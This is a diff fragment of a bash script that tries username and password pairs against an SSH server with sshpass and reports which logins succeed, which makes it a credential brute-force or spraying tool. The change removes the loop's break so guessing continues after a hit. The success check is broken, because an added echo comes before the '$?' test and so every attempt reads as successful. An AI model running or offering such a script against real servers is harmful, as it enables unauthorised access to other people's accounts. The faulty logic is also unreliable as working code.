@@ -16,13 +16,12 @@ do
     echo "Trying to connect as $username ..."
 
     # Try to SSH and run the groups command, using password authentication
-    sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o BatchMode=yes -l "$username" "$SERVER_IP" "groups" 2>/dev/null
-    echo "$username"
-    echo "$password"
+    sshpass -p "$password" ssh -n $username@$SERVER_IP "groups"
+    echo ""
     # Check if the SSH connection was successful
     if [ $? -eq 0 ]; then
         echo "Successful login with username: $username"
-        break # Exit the loop if connection is successful
+#        break # Exit the loop if connection is successful
     else
         echo "Failed to connect with username: $username"
     fi
